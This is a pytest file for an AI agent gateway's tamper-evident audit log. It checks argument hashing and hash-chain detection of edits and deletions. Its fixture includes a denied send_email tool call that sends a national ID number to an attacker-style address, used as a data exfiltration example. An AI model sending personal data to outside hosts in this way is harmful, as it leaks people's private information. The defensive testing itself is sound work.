import json

from gateway.audit import AuditLog, args_hash, verify_chain

SUBJECT = {"agent_id": "cs-assistant", "on_behalf_of": "rm_042", "role": "relationship_manager"}
CTX = {"session_id": "s", "tainted": True, "pii_accessed": True, "call_count": 3}


def _write(log, n=3):
    for i in range(n):
        log.write(event="decision", session_id="s", subject=SUBJECT, tool="send_email",
                  args={"to": "audit@attacker-example.net", "body": f"national_id Z298765431 #{i}"},
                  context=CTX, decision="deny", reason=["R3"], policy_version="v")


def test_args_are_hashed_not_stored(tmp_path):
    log = AuditLog(tmp_path / "a.jsonl")
    _write(log, 1)
    text = (tmp_path / "a.jsonl").read_text(encoding="utf-8")
    assert "Z298765431" not in text and "attacker-example" not in text
    assert json.loads(text)["args_hash"].startswith("sha256:")
    assert args_hash({"b": 1, "a": 2}) == args_hash({"a": 2, "b": 1})


def test_chain_detects_tampering(tmp_path):
    path = tmp_path / "a.jsonl"
    _write(AuditLog(path))
    assert verify_chain(path) == (True, 3)
    lines = path.read_text(encoding="utf-8").splitlines()
    lines[1] = lines[1].replace('"deny"', '"allow"')
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    assert verify_chain(path)[0] is False


def test_chain_detects_deletion_and_survives_restart(tmp_path):
    path = tmp_path / "a.jsonl"
    _write(AuditLog(path), 2)
    _write(AuditLog(path), 2)  # a new process continues the chain
    assert verify_chain(path) == (True, 4)
    lines = path.read_text(encoding="utf-8").splitlines()
    path.write_text("\n".join(lines[:1] + lines[2:]) + "\n", encoding="utf-8")
    assert verify_chain(path)[0] is False
